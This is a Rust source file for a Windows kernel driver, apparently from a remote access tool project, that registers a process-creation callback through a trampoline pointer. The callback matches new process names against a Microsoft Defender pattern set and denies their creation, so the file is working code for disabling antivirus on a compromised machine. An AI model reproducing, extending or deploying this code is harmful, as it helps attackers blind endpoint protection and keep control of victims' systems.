use core::mem;

use rat_common::windows::kernel::KernelHandoff;
use wdk::nt_success;
use wdk_sys::ntddk::PsSetCreateProcessNotifyRoutineEx;
use wdk_sys::{HANDLE, PEPROCESS, PPS_CREATE_NOTIFY_INFO, STATUS_ACCESS_DENIED};

use crate::global::MS_DEFENDER_AHO_CORASICK;
use crate::info;
use crate::utils::match_process_name;

pub fn ps_set_create_process_notify_routine_ex(extra: &KernelHandoff) -> anyhow::Result<*const u8> {
    if !extra.process_notify_trampoline.is_null() {
        let status = unsafe {
            PsSetCreateProcessNotifyRoutineEx(
                Some(mem::transmute::<
                    *const u8,
                    unsafe extern "C" fn(PEPROCESS, HANDLE, PPS_CREATE_NOTIFY_INFO),
                >(extra.process_notify_trampoline)),
                0,
            )
        };

        anyhow::ensure!(
            nt_success(status),
            "PsSetCreateProcessNotifyRoutineEx error: 0x{status:X}",
        );
    }

    Ok(extra.process_notify_trampoline)
}

#[unsafe(export_name = "ProcessNotifyRoutine")]
unsafe extern "C" fn process_notify_routine(
    process: PEPROCESS,
    pid: HANDLE,
    info: PPS_CREATE_NOTIFY_INFO,
) {
    if let Some(info) = unsafe { info.as_mut() }
        && match_process_name(process, &MS_DEFENDER_AHO_CORASICK)
    {
        info!("Blocking creation of process {}", pid as u64);
        info.CreationStatus = STATUS_ACCESS_DENIED;
    }
}
